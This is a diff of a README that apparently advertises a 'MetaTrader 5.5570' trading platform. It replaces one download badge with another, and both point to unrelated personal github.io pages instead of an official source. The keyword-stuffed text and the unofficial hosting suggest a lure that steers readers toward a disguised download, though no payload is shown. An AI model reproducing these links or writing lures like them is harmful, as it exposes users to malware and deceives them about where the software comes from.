@@ -21,7 +21,7 @@ To begin using this **MetaTrader 5.5570 Automated Trading** solution and **MetaT
 | :--- | :--- |
 | **Get MetaTrader 5.5570 Trading Platform** | Click the button below to initiate the setup for this **MetaTrader 5.5570 Forex Software**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_MetaTrader_5.5570_Trading_Platform-2ea44f?style=for-the-badge)](https://rodericklueilwitz88.github.io/.github/metatrader-5-5570)
+[![MetaTrader](https://img.shields.io/badge/Explore-MetaTrader%20-B45309?style=for-the-badge)](https://metatrader-broker-review.github.io/.github/metatrader-crypto)
 
 ## System Requirements
 
